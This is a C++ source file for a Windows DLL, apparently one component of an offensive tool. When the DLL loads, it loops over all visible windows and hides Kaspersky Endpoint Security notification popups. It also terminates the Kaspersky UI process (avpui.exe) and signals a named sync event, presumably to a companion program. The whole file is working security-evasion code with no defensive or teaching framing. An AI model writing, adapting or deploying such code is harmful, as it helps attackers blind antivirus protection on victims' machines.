// ALWAYS COMPILE FOR X86, KASPERSKY DOES NOT RUN IN X64
#include "pch.h"
#include <Windows.h>
#include "ntdll.h"
#include <iostream>
#include <AclAPI.h>
#include <ShlObj.h>
#include <stdio.h>
#include <amsi.h>
#include <io.h>  
#include <ios>
#include <cstdio>
#include <fcntl.h>
#include <conio.h>
#include <bcrypt.h>
#include <vector>
#include <cstdint>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "WindowsApp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "onecore.lib")

#define ALL_SHARING FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE


HMODULE hm = GetModuleHandle(L"ntdll.dll");




static BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lparam) {
	int length = GetWindowTextLength(hWnd);
	wchar_t* buffer = new wchar_t[length + 1];
	GetWindowText(hWnd, buffer, length + 1);

	std::wstring name = L"avpui.exe";
	if (IsWindowVisible(hWnd) && length != 0) {
		if (_wcsicmp(buffer, L"Notification from Kaspersky Endpoint Security") == 0)
		{
			ShowWindow(hWnd, SW_HIDE);
			Sleep(1000);
			DWORD pid = 0;

			// Create toolhelp snapshot.
			HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 process;
			ZeroMemory(&process, sizeof(process));
			process.dwSize = sizeof(process);

			// Walkthrough all processes.
			if (Process32First(snapshot, &process))
			{
				do
				{
					// Compare process.szExeFile based on format of name, i.e., trim file path
					// trim .exe if necessary, etc.
					if (process.th32ProcessID == GetCurrentProcessId())
						continue;
					if (std::wstring(process.szExeFile) == std::wstring(name) )
					{
						HANDLE hp = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
						if (hp) {
							TerminateProcess(hp, ERROR_SUCCESS);
							CloseHandle(hp);
						}
						ExitProcess(ERROR_SUCCESS);
						continue;
					}
				} while (Process32Next(snapshot, &process));
			}

			CloseHandle(snapshot);
		}
	}
	delete[] buffer;
	return TRUE;
}


VOID MySnakeIsSolid()
{
	
	

	HANDLE hevent = OpenEvent(EVENT_ALL_ACCESS, FALSE, L"Local\\HardBreacher-SolidSnake-Sync-Event");
	SetEvent(hevent);
	



	AllocConsole();

	FILE* fDummy;
	freopen_s(&fDummy, "CONIN$", "r", stdin);
	freopen_s(&fDummy, "CONOUT$", "w", stderr);
	freopen_s(&fDummy, "CONOUT$", "w", stdout);

	while (1) { EnumWindows(enumWindowCallback, NULL); }

	ExitProcess(1);
	
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	MySnakeIsSolid();
	ExitProcess(1);
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
